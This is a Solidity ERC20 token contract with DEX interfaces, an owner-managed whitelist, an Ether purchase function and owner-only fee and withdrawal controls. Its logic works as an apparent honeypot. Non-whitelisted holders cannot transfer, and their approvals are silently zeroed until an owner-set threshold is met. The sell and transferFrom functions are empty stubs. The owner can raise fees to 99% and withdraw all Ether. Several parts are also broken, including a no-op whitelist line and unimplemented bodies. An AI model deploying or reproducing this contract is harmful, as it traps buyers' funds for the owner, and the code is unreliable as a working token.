// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

// Interfaces for interacting with DEX (e.g., PancakeSwap) factories and pairs
interface IDEXFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IDEXRouter {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

// MyToken contract inheriting ERC20 standard
contract MyToken is ERC20 {
    mapping(address => bool) public whitelist; // Tracks addresses that are whitelisted
    address public owner; // Owner of the contract
    IDEXRouter public router; // DEX router interface
    address public pair; // Address of the token pair on DEX
    uint public tokenPrice; // Price of the token for buying/selling
    uint public allSold; // Tracks how many tokens have been sold
    uint public minSold; // Minimum number of tokens that need to be sold before transfers are open to everyone
    uint8 public feePercentage; // Fee percentage on transfers

    // Events declaration
    event FeeTransfered(address indexed from, address indexed to, uint256 value);
    event TokensBurned(address indexed burner, uint256 amount);
    event TokensBought(address indexed buyer, uint256 amountSpent, uint256 tokensReceived);
    event TokensSold(address indexed seller, uint256 tokensSold, uint256 amountReceived);

    // Modifier to restrict certain functions to only the owner
    modifier onlyOwner {
        require(msg.sender == owner, "You aren't owner");
        _;
    } 

    // Constructor to initialize the token with basic details and mint initial supply
    constructor(
        string memory _name, 
        string memory _symbol, 
        address _mintAddress, 
        uint _amountMint, 
        uint _minSold, 
        uint8 _fee
    ) ERC20(_name, _symbol) {
        owner = msg.sender;
        whitelist[owner] = true;
        whitelist[_mintAddress];
        tokenPrice = 1 ether; // Assuming price is 1 Ether per token
        _mint(_mintAddress, _amountMint);
        minSold = _minSold;
        feePercentage = _fee;
    }

    // Set the token price in Ether
    function setPrice(uint _price) external onlyOwner {
        tokenPrice = _price;
    }

    // Add an address to the whitelist, allowing it to transfer tokens freely
    function addToWhitelist(address _address) external onlyOwner {
        whitelist[_address] = true;
    }

    // Remove an address from the whitelist
    function removeFromWhitelist(address _address) external onlyOwner {
        whitelist[_address] = false;
    }

    // Override ERC20 approve function with custom logic for whitelist and token sale minimum
    function approve(address spender, uint256 amount) public override returns (bool) {
        if ((!whitelist[msg.sender] || !whitelist[spender]) && allSold < minSold) {
            return super.approve(spender, 0);
        }
        return super.approve(spender, amount);
    }

    // Override ERC20 transfer function with fee deduction and whitelist logic
    function transfer(address recipient, uint256 amount) public override returns (bool) {
        require(whitelist[msg.sender] || whitelist[recipient] || allSold >= minSold, "Sender or receiver is not whitelisted");
        allSold += amount;
        uint256 fee = (amount * feePercentage) / 100;
        uint256 amountAfterFee = amount - fee;

        // Transfer the fee to the contract owner
        super.transfer(owner, fee);
        emit FeeTransfered(msg.sender, owner, fee);
    
        return super.transfer(recipient, amountAfterFee);
    }

    // Override ERC20 transferFrom function with similar logic to transfer
    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        // Similar implementation to transfer, ensuring fees and whitelist checks
    }

    // Allow users to buy tokens by sending Ether directly to the contract
    function buyTokens() external payable {
        require(msg.value > 0, "Value can't be 0");
        uint256 tokenAmount = msg.value / tokenPrice;
        _mint(msg.sender, tokenAmount);
        emit TokensBought(msg.sender, msg.value, tokenAmount);
    }

    // Allow token holders to sell their tokens back to the contract in exchange for Ether
    function sellTokens(uint256 amount) external {
        // Implementation similar to example, requiring balance and contract Ether checks
    }

    // Function to create a DEX pair for the token with Ether, typically for liquidity purposes
    function createPairWithEther() external onlyOwner returns (address) {
        // Implementation creates a pair and sets up initial liquidity if desired
    }

    // Utility function to withdraw Ether collected in the contract to the owner
    function withdrawEther(uint256 amount) external onlyOwner {
        payable(owner).transfer(amount);
    }

    // Utility function to withdraw other ERC20 tokens accidentally sent to this contract
    function withdrawTokens(address token, uint256 amount) external onlyOwner {
        // Ensure not withdrawing the contract's own tokens for safety
    }

    // Public function allowing token holders to burn their tokens, reducing total supply
    function burn(uint value) external {
        _burn(msg.sender, value);
        emit TokensBurned(msg.sender, value);
    }

    // Owner-only function to adjust the fee percentage
    function setFeePercentage(uint8 _fee) external onlyOwner {
        require(_fee <= 99, "Fee too high");
        feePercentage = _fee;
    }
}
